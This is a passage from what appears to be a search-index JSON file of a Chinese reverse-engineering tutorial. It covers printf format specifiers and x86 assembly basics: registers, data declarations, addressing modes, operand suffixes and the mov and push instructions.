double \u6574\u578b\u53c2\u6570\u3002\u5bf9\u4e8e\u5b57\u7b26\u4e32 s \u7c7b\u578b\uff0c printf \u671f\u5f85\u4e00\u4e2a wchar_t \u6307\u9488\u53c2\u6570\u3002\u5bf9\u4e8e\u5b57\u7b26 c \u7c7b\u578b\uff0c printf \u671f\u5f85\u4e00\u4e2a wint_t \u578b\u7684\u53c2\u6570 ll \u5bf9\u4e8e\u6574\u6570\u7c7b\u578b\uff0c printf \u671f\u5f85\u4e00\u4e2a long long \u6574\u578b\u53c2\u6570\u3002Microsoft \u4e5f\u53ef\u4ee5\u4f7f\u7528 I64 L \u5bf9\u4e8e\u6d6e\u70b9\u7c7b\u578b\uff0c printf \u671f\u5f85\u4e00\u4e2a long double \u6574\u578b\u53c2\u6570 z \u5bf9\u4e8e\u6574\u6570\u7c7b\u578b\uff0c printf \u671f\u5f85\u4e00\u4e2a size_t \u6574\u578b\u53c2\u6570 j \u5bf9\u4e8e\u6574\u6570\u7c7b\u578b\uff0c printf \u671f\u5f85\u4e00\u4e2a intmax_t \u6574\u578b\u53c2\u6570 t \u5bf9\u4e8e\u6574\u6570\u7c7b\u578b\uff0c printf \u671f\u5f85\u4e00\u4e2a ptrdiff_t \u6574\u578b\u53c2\u6570","title":"\u683c\u5f0f\u5b57\u7b26\u4e32"},{"location":"Tutorial/Material/Reverse/#_10","text":"printf(\"Hello %%\"); // \"Hello %\" printf(\"Hello World!\"); // \"Hello World!\" printf(\"Number: %d\", 123); // \"Number: 123\" printf(\"%s %s\", \"Format\", \"Strings\"); // \"Format Strings\" printf(\"%12c\", 'A'); // \" A\" printf(\"%16s\", \"Hello\"); // \" Hello!\" int n; printf(\"%12c%n\", 'A', &n); // n = 12 printf(\"%16s%n\", \"Hello!\", &n); // n = 16 printf(\"%2$s %1$s\", \"Format\", \"Strings\"); // \"Strings Format\" printf(\"%42c%1$n\", &n); // \u9996\u5148\u8f93\u51fa41\u4e2a\u7a7a\u683c\uff0c\u7136\u540e\u8f93\u51fa n \u7684\u4f4e\u516b\u4f4d\u5730\u5740\u4f5c\u4e3a\u4e00\u4e2a\u5b57\u7b26 \u8fd9\u91cc\u6211\u4eec\u5bf9\u683c\u5f0f\u5316\u8f93\u51fa\u51fd\u6570\u548c\u683c\u5f0f\u5b57\u7b26\u4e32\u6709\u4e86\u4e00\u4e2a\u8be6\u7ec6\u7684\u8ba4\u8bc6\uff0c\u540e\u9762\u7684\u7ae0\u8282\u4e2d\u6211\u4eec\u4f1a\u4ecb\u7ecd\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u7684\u5185\u5bb9\u3002","title":"\u4f8b\u5b50"},{"location":"Tutorial/Material/Reverse/#_11","text":"\u6c47\u7f16\u8bed\u8a00 3.3 X86 \u6c47\u7f16\u57fa\u7840 3.3.2 \u5bc4\u5b58\u5668 Registers 3.3.3 \u5185\u5b58\u548c\u5bfb\u5740\u6a21\u5f0f Memory and Addressing Modes 3.3.3.1 \u58f0\u660e\u9759\u6001\u6570\u636e\u533a\u57df 3.3.3.2 \u5185\u5b58\u5bfb\u5740 3.3.3.3 \u64cd\u4f5c\u540e\u7f00 3.3.4 \u6307\u4ee4 Instructions 3.3.4.1 \u6570\u636e\u79fb\u52a8\u6307\u4ee4 3.3.4.2 \u903b\u8f91\u8fd0\u7b97\u6307\u4ee4 3.3.4.3 \u6d41\u7a0b\u63a7\u5236\u6307\u4ee4 3.3.5 \u8c03\u7528\u7ea6\u5b9a Calling Convention 3.3.5.1 \u8c03\u7528\u8005\u7ea6\u5b9a Caller Rules 3.3.5.2 \u88ab\u8c03\u7528\u8005\u7ea6\u5b9a Callee Rules 3.4 x64 \u6c47\u7f16\u57fa\u7840 3.4.1 \u5bfc\u8bed 3.4.2 \u5bc4\u5b58\u5668 Registers 3.4.3 \u5bfb\u5740\u6a21\u5f0f Addressing modes 3.4.4 \u901a\u7528\u6307\u4ee4 Common instructions mov \u548c lea \u6307\u4ee4 \u7b97\u672f\u548c\u4f4d\u8fd0\u7b97 \u6d41\u7a0b\u63a7\u5236\u6307\u4ee4 setx \u548c movx \u51fd\u6570\u8c03\u7528\u4e0e\u6808 3.4.5 \u6c47\u7f16\u548c gdb 3.5 ARM\u6c47\u7f16\u57fa\u7840 3.5.1 \u5f15\u8a00 3.5.2 ARM \u7684 GNU \u6c47\u7f16\u7a0b\u5e8f\u6307\u4ee4\u8868 3.5.3 \u5bc4\u5b58\u5668\u540d\u79f0 3.5.4 \u6c47\u7f16\u7a0b\u5e8f\u7279\u6b8a\u5b57\u7b26/\u8bed\u6cd5 3.5.5 arm\u7a0b\u5e8f\u8c03\u7528\u6807\u51c6 3.5.6 \u5bfb\u5740\u6a21\u5f0f 3.5.7 \u673a\u5668\u76f8\u5173\u6307\u4ee4 3.6 MIPS\u6c47\u7f16\u57fa\u7840 \u6570\u636e\u7c7b\u578b\u548c\u5e38\u91cf \u5bc4\u5b58\u5668 \u7a0b\u5e8f\u7ed3\u6784 \u6570\u636e\u58f0\u660e \u4ee3\u7801 \u6ce8\u91ca \u53d8\u91cf\u58f0\u660e \u8bfb\u53d6/\u5199\u5165 ( Load/Store )\u6307\u4ee4 \u95f4\u63a5\u548c\u7acb\u5373\u5bfb\u5740 \u7b97\u672f\u6307\u4ee4 \u6d41\u7a0b\u63a7\u5236 \u7cfb\u7edf\u8c03\u7528\u548c I / O\uff08 \u9488\u5bf9 SPIM \u6a21\u62df\u5668 \uff09","title":"\u6c47\u7f16\u8bed\u8a00"},{"location":"Tutorial/Material/Reverse/#33-x86","text":"","title":"3.3 X86 \u6c47\u7f16\u57fa\u7840"},{"location":"Tutorial/Material/Reverse/#332-registers","text":"\u73b0\u4ee3 ( 386\u53ca\u4ee5\u4e0a\u7684\u673a\u5668 )x86 \u5904\u7406\u5668\u6709 8 \u4e2a 32 \u4f4d\u901a\u7528\u5bc4\u5b58\u5668, \u5982\u56fe 1 \u6240\u793a. \u8fd9\u4e9b\u5bc4\u5b58\u5668\u7684\u540d\u5b57\u90fd\u662f\u6709\u70b9\u5386\u53f2\u7684, \u4f8b\u5982 EAX \u8fc7\u53bb\u88ab\u79f0\u4e3a \u7d2f\u52a0\u5668 , \u56e0\u4e3a\u5b83\u88ab\u7528\u6765\u4f5c\u5f88\u591a\u7b97\u672f\u8fd0\u7b97, \u8fd8\u6709 ECX \u88ab\u79f0\u4e3a \u8ba1\u6570\u5668 , \u56e0\u4e3a\u5b83\u88ab\u7528\u6765\u4fdd\u5b58\u5faa\u73af\u7684\u7d22\u5f15 ( \u5c31\u662f\u5faa\u73af\u6b21\u6570 ). \u5c3d\u7ba1\u5927\u591a\u662f\u5bc4\u5b58\u5668\u5728\u73b0\u4ee3\u6307\u4ee4\u96c6\u4e2d\u5df2\u7ecf\u5931\u53bb\u4e86\u5b83\u4eec\u7684\u7279\u6b8a\u7528\u9014, \u4f46\u662f\u6309\u7167\u60ef\u4f8b, \u5176\u4e2d\u6709\u4e24\u4e2a\u5bc4\u5b58\u5668\u8fd8\u662f\u6709\u5b83\u4eec\u7684\u7279\u6b8a\u7528\u9014 --- ESP \u548c EBP. \u5bf9\u4e8e EAS , EBX , ECX \u8fd8\u6709 EDX \u5bc4\u5b58\u5668, \u5b83\u4eec\u53ef\u4ee5\u88ab\u5206\u6bb5\u5f00\u6765\u4f7f\u7528. \u4f8b\u5982, \u53ef\u4ee5\u5c06 EAX \u7684\u6700\u4f4e\u7684 2 \u4f4d\u5b57\u8282\u89c6\u4e3a 16 \u4f4d\u5bc4\u5b58\u5668 ( AX ). \u8fd8\u53ef\u4ee5\u5c06 AX \u7684\u6700\u4f4e\u4f4d\u7684 1 \u4e2a\u5b57\u8282\u770b\u6210 8 \u4f4d\u5bc4\u5b58\u5668\u6765\u7528 ( AL ), \u5f53\u7136 AX \u7684\u9ad8\u4f4d\u7684 1 \u4e2a\u5b57\u8282\u4e5f\u53ef\u4ee5\u770b\u6210\u662f\u4e00\u4e2a 8 \u4f4d\u5bc4\u5b58\u5668 ( AH ). \u8fd9\u4e9b\u540d\u79f0\u6709\u5b83\u4eec\u76f8\u5bf9\u5e94\u7684\u7269\u7406\u5bc4\u5b58\u5668. \u5f53\u4e24\u4e2a\u5b57\u8282\u5927\u5c0f\u7684\u6570\u636e\u88ab\u653e\u5230 DX \u7684\u65f6\u5019, \u539f\u672c DH , DL \u548c EDX \u7684\u6570\u636e\u4f1a\u53d7\u5230\u5f71\u54cd ( \u88ab\u8986\u76d6\u4e4b\u7c7b\u7684 ). \u8fd9\u4e9b \" \u5b50\u5bc4\u5b58\u5668 \" \u4e3b\u8981\u6765\u81ea\u4e8e\u6bd4\u8f83\u4e45\u8fdc\u7684 16 \u4f4d\u7248\u672c\u6307\u4ee4\u96c6. \u7136\u800c, \u59dc\u8fd8\u662f\u8001\u7684\u8fa3, \u5728\u5904\u7406\u5c0f\u4e8e 32 \u4f4d\u7684\u6570\u636e\u7684\u65f6\u5019, \u6bd4\u5982 1 \u4e2a\u5b57\u8282\u7684 ASCII \u5b57\u7b26, \u5b83\u4eec\u6709\u65f6\u4f1a\u5f88\u65b9\u4fbf.","title":"3.3.2 \u5bc4\u5b58\u5668 Registers"},{"location":"Tutorial/Material/Reverse/#333-memory-and-addressing-modes","text":"","title":"3.3.3 \u5185\u5b58\u548c\u5bfb\u5740\u6a21\u5f0f Memory and Addressing Modes"},{"location":"Tutorial/Material/Reverse/#3331","text":"\u4f60\u53ef\u4ee5\u7528\u7279\u6b8a\u7684 x86 \u6c47\u7f16\u6307\u4ee4\u5728\u5185\u5b58\u4e2d\u58f0\u660e\u9759\u6001\u6570\u636e\u533a\u57df ( \u7c7b\u4f3c\u4e8e\u5168\u5c40\u53d8\u91cf ). .data \u6307\u4ee4\u7528\u6765\u58f0\u660e\u6570\u636e. \u6839\u636e\u8fd9\u6761\u6307\u4ee4, .byte , .short \u548c .long \u53ef\u4ee5\u5206\u522b\u7528\u6765\u58f0\u660e 1 \u4e2a\u5b57\u8282, 2 \u4e2a\u5b57\u8282\u548c 4 \u4e2a\u5b57\u8282\u7684\u6570\u636e. \u6211\u4eec\u53ef\u4ee5\u7ed9\u5b83\u4eec\u6253\u4e2a\u6807\u7b7e, \u7528\u6765\u5f15\u7528\u521b\u5efa\u7684\u6570\u636e\u7684\u5730\u5740. \u6807\u7b7e\u5728\u6c47\u7f16\u8bed\u8a00\u4e2d\u662f\u975e\u5e38\u6709\u7528\u7684, \u5b83\u4eec\u7ed9\u5185\u5b58\u5730\u5740\u547d\u540d, \u7136\u540e \u7f16\u8bd1\u5668 \u548c \u94fe\u63a5\u5668 \u5c06\u5176 \" \u7ffb\u8bd1 \" \u6210\u8ba1\u7b97\u673a\u7406\u89e3\u7684\u673a\u5668\u4ee3\u7801. \u8fd9\u4e2a\u8ddf\u7528\u540d\u79f0\u6765\u58f0\u660e\u53d8\u91cf\u5f88\u7c7b\u4f3c, \u4f46\u662f\u5b83\u9075\u5b88\u4e00\u4e9b\u8f83\u4f4e\u7ea7\u522b\u7684\u89c4\u5219. \u4f8b\u5982, \u6309\u987a\u5e8f\u58f0\u660e\u7684\u4f4d\u7f6e\u5c06\u5f7c\u6b64\u76f8\u90bb\u5730\u5b58\u50a8\u5728\u5185\u5b58\u4e2d. \u8fd9\u8bdd\u4e5f\u8bb8\u6709\u70b9\u7ed5, \u5c31\u662f\u6309\u7167\u987a\u5e8f\u6253\u7684\u6807\u7b7e, \u8fd9\u4e9b\u6807\u7b7e\u5bf9\u5e94\u7684\u6570\u636e\u4e5f\u4f1a\u6309\u7167\u987a\u5e8f\u88ab\u653e\u5230\u5185\u5b58\u4e2d. \u4e00\u4e9b\u4f8b\u5b50 : .data var : .byte 64 ;\u58f0\u660e\u4e00\u4e2a\u5b57\u8282\u578b\u53d8\u91cf var, \u5176\u6240\u5bf9\u5e94\u7684\u6570\u636e\u662f64 .byte 10 ;\u58f0\u660e\u4e00\u4e2a\u6570\u636e 10, \u8fd9\u4e2a\u6570\u636e\u6ca1\u6709\u6240\u8c13\u7684 \" \u6807\u7b7e \", \u5b83\u7684\u5185\u5b58\u5730\u5740\u5c31\u662f var+1. x : .short 42 ;\u58f0\u660e\u4e00\u4e2a\u5927\u5c0f\u4e3a 2 \u4e2a\u5b57\u8282\u7684\u6570\u636e, \u8fd9\u4e2a\u6570\u636e\u6709\u4e2a\u6807\u7b7e \" x \" y : .long 30000 ;\u58f0\u660e\u4e00\u4e2a\u5927\u5c0f\u4e3a 4 \u4e2a\u5b57\u8282\u7684\u6570\u636e, \u8fd9\u4e2a\u6570\u636e\u6807\u7b7e\u662f \" y \", y \u7684\u503c\u88ab\u521d\u59cb\u5316\u4e3a 30000 \u4e0e\u9ad8\u7ea7\u8bed\u8a00\u4e0d\u540c, \u9ad8\u7ea7\u8bed\u8a00\u7684\u6570\u7ec4\u53ef\u4ee5\u5177\u6709\u591a\u4e2a\u7ef4\u5ea6\u5e76\u4e14\u53ef\u4ee5\u901a\u8fc7\u7d22\u5f15\u6765\u8bbf\u95ee, x86 \u6c47\u7f16\u8bed\u8a00\u7684\u6570\u7ec4\u53ea\u662f\u5728\u5185\u5b58\u4e2d\u8fde\u7eed\u7684\" \u5355\u5143\u683c \". \u4f60\u53ea\u9700\u8981\u628a\u6570\u503c\u5217\u51fa\u6765\u5c31\u53ef\u4ee5\u58f0\u660e\u4e00\u4e2a\u6570\u7ec4, \u6bd4\u5982\u4e0b\u9762\u7684\u7b2c\u4e00\u4e2a\u4f8b\u5b50. \u5bf9\u4e8e\u4e00\u4e9b\u5b57\u8282\u578b\u6570\u7ec4\u7684\u7279\u6b8a\u60c5\u51b5, \u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u5b57\u7b26\u4e32. \u5982\u679c\u8981\u5728\u5927\u591a\u6570\u7684\u5185\u5b58\u586b\u5145 0, \u4f60\u53ef\u4ee5\u4f7f\u7528 .zero \u6307\u4ee4. \u4f8b\u5b50 : s : .long 1, 2, 3 ;\u58f0\u660e 3 \u4e2a\u5927\u5c0f\u4e3a 4 \u5b57\u8282\u7684\u6570\u636e 1, 2, 3. \u5185\u5b58\u4e2d s+8 \u8fd9\u4e2a\u6807\u7b7e\u6240\u5bf9\u5e94\u7684\u6570\u636e\u5c31\u662f 3. barr: .zero 10 ;\u4ece barr \u8fd9\u4e2a\u6807\u7b7e\u7684\u4f4d\u7f6e\u5f00\u59cb, \u58f0\u660e 10 \u4e2a\u5b57\u8282\u7684\u6570\u636e, \u8fd9\u4e9b\u6570\u636e\u88ab\u521d\u59cb\u5316\u4e3a 0. str : .string \"hello\" ;\u4ece str \u8fd9\u4e2a\u6807\u7b7e\u7684\u4f4d\u7f6e\u5f00\u59cb, \u58f0\u660e 6 \u4e2a\u5b57\u8282\u7684\u6570\u636e, \u5373 hello \u5bf9\u5e94\u7684 ASCII \u503c, \u8fd9\u6700\u540e\u8fd8\u8ddf\u6709\u4e00\u4e2a nul(0) \u5b57\u8282.","title":"3.3.3.1 \u58f0\u660e\u9759\u6001\u6570\u636e\u533a\u57df"},{"location":"Tutorial/Material/Reverse/#3332","text":"\u73b0\u4ee3x86\u517c\u5bb9\u5904\u7406\u5668\u80fd\u591f\u5bfb\u5740\u9ad8\u8fbe 2^32 \u5b57\u8282\u7684\u5185\u5b58 : \u5185\u5b58\u5730\u5740\u4e3a 32 \u4f4d\u5bbd. \u5728\u4e0a\u9762\u7684\u793a\u4f8b\u4e2d\uff0c\u6211\u4eec\u4f7f\u7528\u6807\u7b7e\u6765\u5f15\u7528\u5185\u5b58\u533a\u57df\uff0c\u8fd9\u4e9b\u6807\u7b7e\u5b9e\u9645\u4e0a\u88ab 32 \u4f4d\u6570\u636e\u7684\u6c47\u7f16\u7a0b\u5e8f\u66ff\u6362\uff0c\u8fd9\u4e9b\u6570\u636e\u6307\u5b9a\u4e86\u5185\u5b58\u4e2d\u7684\u5730\u5740. \u9664\u4e86\u652f\u6301\u901a\u8fc7\u6807\u7b7e\uff08\u5373\u5e38\u6570\u503c\uff09\u5f15\u7528\u5b58\u50a8\u533a\u57df\u4e4b\u5916\uff0cx86\u63d0\u4f9b\u4e86\u4e00\u79cd\u7075\u6d3b\u7684\u8ba1\u7b97\u548c\u5f15\u7528\u5185\u5b58\u5730\u5740\u7684\u65b9\u6848 \uff1a\u6700\u591a\u53ef\u5c06\u4e24\u4e2a32\u4f4d\u5bc4\u5b58\u5668\u548c\u4e00\u4e2a32\u4f4d\u6709\u7b26\u53f7\u5e38\u91cf\u76f8\u52a0\uff0c\u4ee5\u8ba1\u7b97\u5b58\u50a8\u5668\u5730\u5740. \u5176\u4e2d\u4e00\u4e2a\u5bc4\u5b58\u5668\u53ef\u4ee5\u9009\u62e9\u9884\u5148\u4e58\u4ee5 2, 4 \u6216 8. \u5bfb\u5740\u6a21\u5f0f\u53ef\u4ee5\u548c\u8bb8\u591a x86 \u6307\u4ee4\u4e00\u8d77\u4f7f\u7528 ( \u6211\u4eec\u5c06\u5728\u4e0b\u4e00\u8282\u5bf9\u5b83\u4eec\u8fdb\u884c\u8bb2\u89e3 ). \u8fd9\u91cc\u6211\u4eec\u7528 mov \u6307\u4ee4\u5728\u5bc4\u5b58\u5668\u548c\u5185\u5b58\u4e2d\u79fb\u52a8\u6570\u636e\u5f53\u4f5c\u4f8b\u5b50. \u8fd9\u4e2a\u6307\u4ee4\u6709\u4e24\u4e2a\u53c2\u6570, \u7b2c\u4e00\u4e2a\u662f\u6570\u636e\u7684\u6765\u6e90, \u7b2c\u4e8c\u4e2a\u662f\u6570\u636e\u7684\u53bb\u5411. \u4e00\u4e9b mov \u7684\u4f8b\u5b50 : mov (%ebx), %eax ;\u4ece EBX \u4e2d\u7684\u5185\u5b58\u5730\u5740\u52a0\u8f7d 4 \u4e2a\u5b57\u8282\u7684\u6570\u636e\u5230 EAX, \u5c31\u662f\u628a EBX \u4e2d\u7684\u5185\u5bb9\u5f53\u4f5c\u6807\u7b7e, \u8fd9\u4e2a\u6807\u7b7e\u5728\u5185\u5b58\u4e2d\u5bf9\u5e94\u7684\u6570\u636e\u653e\u5230 EAX \u4e2d ;\u540e\u9762\u5982\u679c\u6ca1\u6709\u8bf4\u660e\u7684\u8bdd, (%ebx)\u5c31\u8868\u793a\u5bc4\u5b58\u5668ebx\u4e2d\u5b58\u50a8\u7684\u5185\u5bb9 mov %ebx, var(,1) ; \u5c06 EBX \u4e2d\u7684 4 \u4e2a\u5b57\u8282\u5927\u5c0f\u7684\u6570\u636e\u79fb\u52a8\u7684\u5185\u5b58\u4e2d\u6807\u7b7e\u4e3a var \u7684\u5730\u65b9\u53bb.( var \u662f\u4e00\u4e2a 32 \u4f4d\u5e38\u6570). mov (%esi, %ebx, 4), %edx ;\u5c06\u5185\u5b58\u4e2d\u6807\u7b7e\u4e3a ESI+4*EBX \u6240\u5bf9\u5e94\u7684 4 \u4e2a\u5b57\u8282\u5927\u5c0f\u7684\u6570\u636e\u79fb\u52a8\u5230 EDX\u4e2d. \u4e00\u4e9b \u9519\u8bef \u7684\u4f8b\u5b50: mov (%ebx, %ecx, -1), %eax ;\u8fd9\u4e2a\u53ea\u80fd\u628a\u5bc4\u5b58\u5668\u4e2d\u7684\u503c\u52a0\u4e0a\u4e00\u904d. mov %ebx,(%eax, %esi, %edi, 1) ;\u5728\u5730\u5740\u8ba1\u7b97\u4e2d, \u6700\u591a\u53ea\u80fd\u51fa\u73b0 2 \u4e2a\u5bc4\u5b58\u5668, \u8fd9\u91cc\u5374\u6709 3 \u4e2a\u5bc4\u5b58\u5668.","title":"3.3.3.2 \u5185\u5b58\u5bfb\u5740"},{"location":"Tutorial/Material/Reverse/#3333","text":"\u901a\u5e38, \u7ed9\u5b9a\u5185\u5b58\u5730\u5740\u7684\u6570\u636e\u7c7b\u578b\u53ef\u4ee5\u4ece\u5f15\u7528\u5b83\u7684\u6c47\u7f16\u6307\u4ee4\u63a8\u65ad\u51fa\u6765. \u4f8b\u5982, \u5728\u4e0a\u9762\u7684\u6307\u4ee4\u4e2d, \u4f60\u53ef\u4ee5\u4ece\u5bc4\u5b58\u5668\u64cd\u4f5c\u6570\u7684\u5927\u5c0f\u6765\u63a8\u51fa\u5176\u6240\u5360\u7684\u5185\u5b58\u5927\u5c0f. \u5f53\u6211\u4eec\u52a0\u8f7d\u4e00\u4e2a 32 \u4f4d\u7684\u5bc4\u5b58\u5668\u7684\u65f6\u5019, \u7f16\u8bd1\u5668\u5c31\u53ef\u4ee5\u63a8\u65ad\u51fa\u6211\u4eec\u7528\u5230\u7684\u5185\u5b58\u5927\u5c0f\u662f 4 \u4e2a\u5b57\u8282\u5bbd. \u5f53\u6211\u4eec\u5c06 1 \u4e2a\u5b57\u8282\u5bbd\u7684\u5bc4\u5b58\u5668\u7684\u503c\u4fdd\u5b58\u5230\u5185\u5b58\u4e2d\u65f6, \u7f16\u8bd1\u5668\u53ef\u4ee5\u63a8\u65ad\u51fa\u6211\u4eec\u60f3\u8981\u5728\u5185\u5b58\u4e2d\u5f04\u4e2a 1 \u5b57\u8282\u5927\u5c0f\u7684 \" \u5751 \" \u6765\u4fdd\u5b58\u6211\u4eec\u7684\u6570\u636e. \u7136\u800c\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b, \u6211\u4eec\u7528\u5230\u7684\u5185\u5b58\u4e2d \" \u5751 \" \u7684\u5927\u5c0f\u662f\u4e0d\u660e\u786e\u7684. \u6bd4\u5982\u8bf4\u8fd9\u6761\u6307\u4ee4 mov $2,(%ebx) . \u8fd9\u6761\u6307\u4ee4\u662f\u5426\u5e94\u8be5\u5c06 \" 2 \" \u8fd9\u4e2a\u503c\u79fb\u52a8\u5230 EBX \u4e2d\u7684\u503c\u6240\u4ee3\u8868\u7684\u5730\u5740 \" \u5751 \" \u7684\u5355\u4e2a\u5b57\u8282\u4e2d ? \u4e5f\u8bb8\u5b83\u8868\u793a\u7684\u662f\u5c06 32 \u4f4d\u6574\u6570\u8868\u793a\u7684 2 \u79fb\u52a8\u5230\u4ece\u5730\u5740 EBX \u5f00\u59cb\u7684 4 \u5b57\u8282. \u65e2\u7136\u8fd9\u4e24\u4e2a\u89e3\u91ca\u90fd\u6709\u9053\u7406, \u4f46\u8ba1\u7b97\u673a\u6c47\u7f16\u7a0b\u5e8f\u5fc5\u987b\u660e\u786e\u54ea\u4e2a\u89e3\u91ca\u624d\u662f\u6b63\u786e\u7684, \u8ba1\u7b97\u673a\u5f88\u5355\u7eaf\u7684, \u8981\u4e48\u662f\u9519\u7684\u8981\u4e48\u662f\u5bf9\u7684. \u524d\u7f00 b, w, \u548c l \u5c31\u662f\u6765\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u7684, \u5b83\u4eec\u5206\u522b\u8868\u793a 1, 2 \u548c 4 \u4e2a\u5b57\u8282\u7684\u5927\u5c0f. \u4e3e\u51e0\u4e2a\u4f8b\u5b50 : movb $2, (%ebx) ;\u5c06 2 \u79fb\u5165\u5230 ebx \u4e2d\u7684\u503c\u6240\u8868\u793a\u7684\u5730\u5740\u5355\u5143\u4e2d. movw $2, (%ebx) ;\u5c06 16 \u4f4d\u6574\u6570 2 \u79fb\u52a8\u5230 \u4ece ebx \u4e2d\u7684\u503c\u6240\u8868\u793a\u7684\u5730\u5740\u5355\u5143 \u5f00\u59cb\u7684 2 \u4e2a\u5b57\u8282\u4e2d;\u8fd9\u8bdd\u6709\u70b9\u7ed5, \u6240\u4ee5\u6211\u6545\u610f\u5728\u91cc\u9762\u52a0\u4e86\u70b9\u7a7a\u683c, \u65b9\u4fbf\u5927\u5bb6\u7406\u89e3. movl $2,(%ebx) ;\u5c06 32 \u4f4d\u6574\u6570 2 \u79fb\u52a8\u5230 \u4ece ebx\u4e2d\u7684\u503c\u8868\u793a\u7684\u5730\u5740\u5355\u5143 \u5f00\u59cb\u7684 4 \u4e2a\u5b57\u8282\u4e2d.","title":"3.3.3.3 \u64cd\u4f5c\u540e\u7f00"},{"location":"Tutorial/Material/Reverse/#334-instructions","text":"\u673a\u5668\u6307\u4ee4\u901a\u5e38\u5206\u4e3a 3 \u7c7b : \u6570\u636e\u79fb\u52a8\u6307\u4ee4, \u903b\u8f91\u8fd0\u7b97\u6307\u4ee4\u548c\u6d41\u7a0b\u63a7\u5236\u6307\u4ee4. \u5728\u672c\u8282\u4e2d, \u6211\u4eec\u5c06\u8bb2\u89e3\u6bcf\u4e00\u79cd\u7c7b\u578b\u7684 x86 \u6307\u4ee4\u4ee5\u53ca\u5b83\u4eec\u7684\u91cd\u8981\u793a\u4f8b. \u5f53\u7136, \u6211\u4eec\u4e0d\u53ef\u80fd\u628a x86 \u6240\u6709\u6307\u4ee4\u8bb2\u5f97\u7279\u522b\u8be6\u7ec6, \u6bd5\u7adf\u7bc7\u5e45\u548c\u6c34\u5e73\u6709\u9650. \u5b8c\u6574\u7684\u6307\u4ee4\u5217\u8868, \u8bf7\u53c2\u9605 intel \u7684\u6307\u4ee4\u96c6\u53c2\u8003\u624b\u518c. \u6211\u4eec\u5c06\u4f7f\u7528\u4ee5\u4e0b\u7b26\u53f7 : <reg32 \u4efb\u610f\u7684 32 \u4f4d\u5bc4\u5b58\u5668 (%eax, %ebx, %ecx, %edx, %esi, %edi, %esp \u6216\u8005 %eb) <reg16 \u4efb\u610f\u7684 16 \u4f4d\u5bc4\u5b58\u5668 (%ax, %bx, %cx \u6216\u8005 %dx) <reg8 \u4efb\u610f\u7684 8 \u4f4d\u5bc4\u5b58\u5668 (%ah, %al, %bh, %bl, %ch, %cl, %dh, %dl) <reg \u4efb\u610f\u7684\u5bc4\u5b58\u5668 <mem \u4e00\u4e2a\u5185\u5b58\u5730\u5740, \u4f8b\u5982 (%eax), 4+var, (%eax, %ebx, 1) <con32 32 \u4f4d\u5e38\u6570 <con16 16 \u4f4d\u5e38\u6570 <con8 8 \u4f4d\u5e38\u6570 <con \u4efb\u610f 32\u4f4d, 16 \u4f4d\u6216\u8005 8 \u4f4d\u5e38\u6570 \u5728\u6c47\u7f16\u8bed\u8a00\u4e2d, \u7528\u4f5c \u7acb\u5373\u64cd\u4f5c\u6570 \u7684\u6240\u6709\u6807\u7b7e\u548c\u6570\u5b57\u5e38\u91cf ( \u5373\u4e0d\u5728\u8bf8\u5982 3 (%eax, %ebx, 8) \u8fd9\u6837\u7684\u5730\u5740\u8ba1\u7b97\u4e2d ) \u603b\u662f\u4ee5\u7f8e\u5143\u7b26\u53f7 $ \u4e3a\u524d\u7f00. \u9700\u8981\u7684\u65f6\u5019, \u524d\u7f00 0x \u8868\u793a\u5341\u516d\u8fdb\u5236\u6570, \u4f8b\u5982 $ 0xABC . \u5982\u679c\u6ca1\u6709\u524d\u7f00, \u5219\u9ed8\u8ba4\u8be5\u6570\u5b57\u4e3a\u5341\u8fdb\u5236\u6570.","title":"3.3.4 \u6307\u4ee4 Instructions"},{"location":"Tutorial/Material/Reverse/#3341","text":"mov \u79fb\u52a8 mov \u6307\u4ee4\u5c06\u6570\u636e\u4ece\u5b83\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570 ( \u5373\u5bc4\u5b58\u5668\u4e2d\u7684\u5185\u5bb9, \u5185\u5b58\u5355\u5143\u4e2d\u7684\u5185\u5bb9, \u6216\u8005\u4e00\u4e2a\u5e38\u6570\u503c ) \u590d\u5236\u5230\u5b83\u7684\u7b2c\u4e8c\u4e2a\u53c2\u6570 ( \u5373\u5bc4\u5b58\u5668\u6216\u8005\u5185\u5b58\u5355\u5143 ). \u5f53\u5bc4\u5b58\u5668\u5230\u5bc4\u5b58\u5668\u4e4b\u95f4\u7684\u6570\u636e\u79fb\u52a8\u662f\u53ef\u884c\u7684\u65f6\u5019, \u76f4\u63a5\u5730\u4ece\u5185\u5b58\u5355\u5143\u4e2d\u5c06\u6570\u636e\u79fb\u52a8\u5230\u53e6\u4e00\u5185\u5b58\u5355\u5143\u4e2d\u662f\u4e0d\u884c\u7684. \u5728\u8fd9\u79cd\u9700\u8981\u5728\u5185\u5b58\u5355\u5143\u4e2d\u4f20\u9012\u6570\u636e\u7684\u60c5\u51b5\u4e0b, \u5b83\u6570\u636e\u6765\u6e90\u7684\u90a3\u4e2a\u5185\u5b58\u5355\u5143\u5fc5\u987b\u9996\u5148\u628a\u90a3\u4e2a\u5185\u5b58\u5355\u5143\u4e2d\u7684\u6570\u636e\u52a0\u8f7d\u5230\u4e00\u4e2a\u5bc4\u5b58\u5668\u4e2d, \u7136\u540e\u624d\u53ef\u4ee5\u901a\u8fc7\u8fd9\u4e2a\u5bc4\u5b58\u5668\u6765\u628a\u6570\u636e\u79fb\u52a8\u5230\u76ee\u6807\u5185\u5b58\u5355\u5143\u4e2d. \u8bed\u6cd5 mov <reg, <reg mov <reg, <mem mov <mem, <reg mov <con, <reg mov <con, <mem \u4f8b\u5b50 mov %ebx, %eax ;\u5c06 EBX \u4e2d\u7684\u503c\u590d\u5236\u5230 EAX \u4e2d mov $5, var(,1) ;\u5c06\u6570\u5b57 5 \u5b58\u5230\u5b57\u8282\u578b\u5185\u5b58\u5355\u5143 \" var \" push \u5165\u6808 push \u6307\u4ee4\u5c06\u5b83\u7684\u53c2\u6570\u79fb\u52a8\u5230\u786c\u4ef6\u652f\u6301\u7684 \u6808 \u5185\u5b58\u9876\u7aef. \u7279\u522b\u5730, push \u9996\u5148\u5c06 ESP \u4e2d\u7684\u503c\u51cf\u5c11 4, \u7136\u540e\u5c06\u5b83\u7684\u53c2\u6570\u79fb\u52a8\u5230\u4e00\u4e2a 32 \u4f4d\u7684\u5730\u5740\u5355\u5143 ( %esp ). ESP ( \u6808\u6307\u9488 ) 